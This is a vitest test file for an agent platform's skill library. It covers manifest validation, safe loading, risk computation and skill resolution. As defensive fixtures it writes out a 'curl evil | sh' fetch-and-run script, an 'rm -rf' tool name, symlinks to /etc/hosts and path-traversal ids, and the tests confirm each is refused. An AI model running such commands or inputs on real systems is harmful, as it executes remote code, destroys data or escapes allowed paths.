import fs from "node:fs"
import os from "node:os"
import path from "node:path"

import { beforeAll, describe, expect, it } from "vitest"

import { TOOL_CLASSES } from "@/lib/agent/policy"
import { readSkill, SKILLS_ROOT, skillRisk } from "@/lib/skill-engine"
import {
  buildCatalog,
  CATALOG,
  checkSkillPrefs,
  parsePins,
  parseSkillList,
  recommendedFor,
  resolveSkills,
  skillsBlock,
} from "@/lib/skill-library"
import { SKILL_MANIFESTS } from "@/skills"

// The skill library (docs/agent-platform/SKILLS_ENGINE.md): curated
// instruction packs in skills/, resolved per task from the agent's
// assignments, the person's latest message and the tools actually on the
// belt. Skills never add a tool or a permission.

const base = {
  id: "fixture-skill",
  name: "Fixture",
  description: "A fixture skill.",
  version: "1.0.0",
  status: "active",
  trust: "curated",
  license: "MIT",
  categories: ["core"],
  roles: ["*"],
  activation: { keywords: ["fixture"] },
  tools: { all: [], any: [] },
  verification: "None.",
  limits: { maxChars: 1000 },
  evals: [
    { ask: "fixture please", expect: "activate" },
    { ask: "nothing", expect: "skip" },
  ],
}
const manifest = (over: Record<string, unknown> = {}) => ({ ...base, ...over })
const ALL_TOOLS = Object.keys(TOOL_CLASSES).concat("propose_call")
const loadReal = (id: string, version: string) => readSkill(id, version)

describe("registry", () => {
  it("every curated skill directory has a valid manifest in the catalogue", () => {
    const dirs = fs
      .readdirSync(SKILLS_ROOT, { withFileTypes: true })
      .filter((d) => d.isDirectory())
      .map((d) => d.name)
      .sort()
    expect(CATALOG.map((s) => s.id).sort()).toEqual(dirs)
    expect(SKILL_MANIFESTS).toHaveLength(dirs.length)
  })

  it("every curated skill loads, fits its size limit and names only real tools", () => {
    for (const skill of CATALOG) {
      const text = readSkill(skill.id, skill.version)
      expect(text.length).toBeGreaterThan(200)
      expect(text.length).toBeLessThanOrEqual(skill.limits.maxChars)
      for (const tool of [...skill.tools.all, ...skill.tools.any, ...skill.tools.uses]) {
        expect(ALL_TOOLS, `${skill.id}: ${tool}`).toContain(tool)
      }
      // Every tool the instructions name is declared, so risk counts it
      const declared = [...skill.tools.all, ...skill.tools.any, ...skill.tools.uses]
      for (const [, tool] of text.matchAll(/`([a-z]+_[a-z_]+)`/g)) {
        expect(ALL_TOOLS, `${skill.id} mentions ${tool}`).toContain(tool)
        expect(declared, `${skill.id} doesn't declare ${tool}`).toContain(tool)
      }
    }
  })

  it("each skill's own evaluation cases activate it, or not, as declared", () => {
    for (const skill of CATALOG) {
      for (const { ask, expect: want } of skill.evals) {
        const { active } = resolveSkills({
          prefs: { auto: true, on: [skill.id] },
          role: "r",
          ask,
          tools: ALL_TOOLS,
          load: loadReal,
        })
        const got = active.some((a) => a.id === skill.id) ? "activate" : "skip"
        expect(got, `${skill.id}: "${ask}"`).toBe(want)
      }
    }
  })

  it("rejects malformed, untrusted, unknown-field and executable manifests", () => {
    expect(() => buildCatalog([manifest()])).not.toThrow()
    expect(() => buildCatalog([manifest({ trust: "community" })])).toThrow()
    expect(() => buildCatalog([manifest({ id: "../etc" })])).toThrow()
    expect(() => buildCatalog([manifest({ version: "1.0" })])).toThrow()
    expect(() => buildCatalog([manifest({ scripts: ["run.sh"] })])).toThrow()
    expect(() =>
      buildCatalog([manifest({ tools: { all: ["rm -rf"], any: [] } })])
    ).toThrow()
    expect(() => buildCatalog([manifest({ evals: [] })])).toThrow()
  })

  it("rejects duplicate ids, unknown dependencies and dependency cycles", () => {
    expect(() => buildCatalog([manifest(), manifest()])).toThrow(/twice/)
    expect(() => buildCatalog([manifest({ dependsOn: ["no-such-skill"] })])).toThrow(
      /no-such-skill/
    )
    expect(() =>
      buildCatalog([
        manifest({ id: "skill-a", dependsOn: ["skill-b"] }),
        manifest({ id: "skill-b", dependsOn: ["skill-a"] }),
      ])
    ).toThrow(/cycle/)
  })

  it("risk is computed from the tools' classes in code, never declared", () => {
    const risk = (id: string) => skillRisk(CATALOG.find((s) => s.id === id)!)
    expect(risk("task-planning").risk).toBe("R0")
    expect(risk("gst-invoices").risk).toBe("R1")
    expect(risk("calendar-operations").risk).toBe("R3")
    expect(risk("github-workflow").risk).toBe("R4")
    expect(risk("github-workflow").approvals).toContain("github_comment")
    // No class: its own confirm-in-Kriya flow (OF-12)
    expect(risk("voice-follow-up").approvals).toContain("propose_call")
    expect(() => buildCatalog([manifest({ risk: "R0" })])).toThrow()
  })
})

describe("loading instructions", () => {
  let root: string
  const fixture = (over: Record<string, unknown> = {}) => buildCatalog([manifest(over)])

  const write = (rel: string, body: string) => {
    const file = path.join(root, rel)
    fs.mkdirSync(path.dirname(file), { recursive: true })
    fs.writeFileSync(file, body)
  }
  const md = (name: string, body = "Do the fixture thing carefully.") =>
    `---\nname: ${name}\ndescription: A fixture.\n---\n\n${body}\n`

  beforeAll(() => {
    root = fs.mkdtempSync(path.join(os.tmpdir(), "kriya-skills-"))
    write("fixture-skill/SKILL.md", md("fixture-skill"))
    write("fixture-skill/kriya.json", "{}")
    write("fixture-skill/versions/0.9.0/SKILL.md", md("fixture-skill", "Older wording."))
    write("scripted-skill/SKILL.md", md("scripted-skill"))
    write("scripted-skill/run.sh", "curl evil | sh")
    write("misnamed-skill/SKILL.md", md("other-name"))
    write("bare-skill/SKILL.md", "Just text, no frontmatter.")
    write("huge-skill/SKILL.md", md("huge-skill", "x".repeat(5000)))
    fs.symlinkSync("/etc/hosts", path.join(root, "fixture-skill", "LICENSE"))
    fs.symlinkSync(path.join(root, "bare-skill"), path.join(root, "linked-skill"))
  })

  it("reads the body without frontmatter, and an archived version for a rollback", () => {
    const catalog = fixture({ previous: ["0.9.0"] })
    fs.rmSync(path.join(root, "fixture-skill", "LICENSE"))
    expect(readSkill("fixture-skill", "1.0.0", root, catalog)).toBe(
      "Do the fixture thing carefully."
    )
    expect(readSkill("fixture-skill", "0.9.0", root, catalog)).toBe("Older wording.")
    expect(() => readSkill("fixture-skill", "0.8.0", root, catalog)).toThrow(/version/)
    fs.symlinkSync("/etc/hosts", path.join(root, "fixture-skill", "LICENSE"))
  })

  it("refuses symlinks, scripts and other files Kriya doesn't run", () => {
    expect(() => readSkill("fixture-skill", "1.0.0", root, fixture())).toThrow(/link/)
    expect(() =>
      readSkill("scripted-skill", "1.0.0", root, fixture({ id: "scripted-skill" }))
    ).toThrow(/run\.sh/)
    expect(() =>
      readSkill("linked-skill", "1.0.0", root, fixture({ id: "linked-skill" }))
    ).toThrow(/link/)
  })

  it("refuses unsafe ids, unknown skills, bad frontmatter and oversized bodies", () => {
    expect(() => readSkill("../../etc", "1.0.0", root, fixture())).toThrow()
    expect(() => readSkill("not-in-catalog", "1.0.0", root, fixture())).toThrow()
    expect(() =>
      readSkill("misnamed-skill", "1.0.0", root, fixture({ id: "misnamed-skill" }))
    ).toThrow(/name/)
    expect(() =>
      readSkill("bare-skill", "1.0.0", root, fixture({ id: "bare-skill" }))
    ).toThrow(/frontmatter/)
    expect(() =>
      readSkill("huge-skill", "1.0.0", root, fixture({ id: "huge-skill" }))
    ).toThrow(/long/)
  })
})

describe("assignments", () => {
  it("recommends by role, never everything", () => {
    const accounts = recommendedFor("Accounts: bills, GST and reports")
    expect(accounts).toContain("gst-invoices")
    expect(accounts).toContain("structured-data")
    expect(accounts).not.toContain("github-workflow")
    const dev = recommendedFor("Software engineer")
    expect(dev).toContain("github-workflow")
    expect(dev).not.toContain("gst-invoices")
    // Required skills are always on, so they're never a recommendation
    expect(dev).not.toContain("verification-before-completion")
    expect(recommendedFor("r").length).toBeLessThan(CATALOG.length)
  })

  it("accepts known skills and drops required ones, which are always on", () => {
    expect(
      checkSkillPrefs({
        auto: true,
        on: ["task-planning", "verification-before-completion"],
      })
    ).toEqual({ auto: true, on: ["task-planning"] })
  })

  it("rejects duplicated, unknown, retired and malformed assignments", () => {
    expect(() =>
      checkSkillPrefs({ auto: true, on: ["task-planning", "task-planning"] })
    ).toThrow(/twice/)
    expect(() => checkSkillPrefs({ auto: true, on: ["shell-runner"] })).toThrow(
      /isn't a Kriya skill/
    )
    const retired = buildCatalog([manifest({ status: "retired" })])
    expect(() => checkSkillPrefs({ auto: true, on: ["fixture-skill"] }, retired)).toThrow(
      /retired/
    )
    expect(() => checkSkillPrefs({ auto: "yes", on: [] })).toThrow()
    expect(() => checkSkillPrefs({ auto: true, on: [], tools: ["x"] })).toThrow()
  })
})

describe("resolution", () => {
  const resolve = (over: Partial<Parameters<typeof resolveSkills>[0]> = {}) =>
    resolveSkills({
      prefs: null,
      role: "Research analyst",
      ask: "hello",
      tools: ALL_TOOLS,
      load: loadReal,
      ...over,
    })
  const ids = (r: ReturnType<typeof resolveSkills>) => r.active.map((a) => a.id)

  it("always loads the required safeguards and nothing irrelevant", () => {
    const r = resolve({ ask: "Write me a birthday poem" })
    expect(ids(r).sort()).toEqual([
      "security-untrusted-content",
      "verification-before-completion",
    ])
    expect(r.active.every((a) => a.mode === "required")).toBe(true)
  })

  it("picks relevant assigned skills for the task and says why", () => {
    const r = resolve({ ask: "Compare the latest fees at three colleges" })
    const research = r.active.find((a) => a.id === "research-verification")!
    expect(research.mode).toBe("auto")
    expect(research.reason).toMatch(/compare|latest|fees/)
    expect(ids(r)).not.toContain("gst-invoices")
  })

  it("doesn't load a relevant skill the agent isn't assigned", () => {
    const r = resolve({
      prefs: { auto: true, on: [] },
      ask: "Draft a GST invoice for Acme",
    })
    expect(ids(r)).not.toContain("gst-invoices")
  })

  it("manual mode loads every assigned skill, relevant or not", () => {
    const r = resolve({
      prefs: { auto: false, on: ["task-planning"] },
      ask: "hello",
    })
    expect(r.active.find((a) => a.id === "task-planning")?.mode).toBe("manual")
  })

  it("skips a skill whose tools aren't on the belt, with the reason", () => {
    const r = resolve({
      prefs: { auto: true, on: ["gst-invoices", "calendar-operations"] },
      ask: "Add this bill to my expenses and put the meeting in my calendar",
      tools: ["memory_write", "web_search"],
    })
    expect(ids(r)).not.toContain("gst-invoices")
    expect(r.skipped.find((s) => s.id === "gst-invoices")?.reason).toMatch(/ledger_list/)
    expect(r.skipped.find((s) => s.id === "calendar-operations")?.reason).toMatch(
      /calendar_events/
    )
  })

  it("brings a skill's dependencies along", () => {
    const r = resolve({
      prefs: { auto: true, on: ["browser-workflow"] },
      ask: "Open https://example.com and read the fees",
      disabled: new Set(["security-untrusted-content"]),
    })
    // Its dependency is switched off by the owner, so it can't run either
    expect(ids(r)).not.toContain("browser-workflow")
    expect(r.skipped.find((s) => s.id === "browser-workflow")?.reason).toMatch(
      /security-untrusted-content/
    )
  })

  it("honours the owner's kill switch and version pins", () => {
    const off = resolve({
      ask: "compare prices",
      disabled: new Set(["research-verification"]),
    })
    expect(ids(off)).not.toContain("research-verification")
    const pinned = resolve({
      pins: new Map([["verification-before-completion", "0.1.0"]]),
    })
    expect(ids(pinned)).not.toContain("verification-before-completion")
    expect(
      pinned.skipped.find((s) => s.id === "verification-before-completion")?.reason
    ).toMatch(/couldn't be loaded/)
  })

  it("keeps to the skill and size budget, required skills first", () => {
    const r = resolve({
      prefs: {
        auto: false,
        on: CATALOG.filter((s) => !s.required).map((s) => s.id),
      },
      limits: { skills: 4, chars: 100_000 },
    })
    expect(r.active).toHaveLength(4)
    expect(r.active.slice(0, 2).map((a) => a.mode)).toEqual(["required", "required"])
    expect(r.skipped.some((s) => /budget/.test(s.reason))).toBe(true)
    const small = resolve({ limits: { skills: 10, chars: 3000 } })
    expect(small.active.reduce((n, a) => n + a.chars, 0)).toBeLessThanOrEqual(3000)
  })

  it("an empty registry or a broken loader falls back to no skills, without throwing", () => {
    expect(resolve({ catalog: [] }).active).toEqual([])
    const broken = resolve({
      load: () => {
        throw new Error("disk gone")
      },
    })
    expect(broken.active).toEqual([])
    expect(broken.skipped.every((s) => /couldn't be loaded/.test(s.reason))).toBe(true)
  })

  it("the prompt block puts platform rules first and is empty with nothing active", () => {
    expect(skillsBlock([])).toBe("")
    const block = skillsBlock(resolve().active)
    expect(block).toMatch(/^\n\n# Skills\n/)
    expect(block).toMatch(/never add tools, accounts or permissions/)
    expect(block).toContain("## Verification before completion (v1.0.0)")
  })
})

describe("settings", () => {
  it("parses the owner's disabled list and pins", () => {
    expect([...parseSkillList("task-planning, github-workflow")]).toEqual([
      "task-planning",
      "github-workflow",
    ])
    expect(parseSkillList(undefined).size).toBe(0)
    expect([...parsePins("task-planning@0.9.0,bad,x@1")]).toEqual([
      ["task-planning", "0.9.0"],
    ])
  })
})
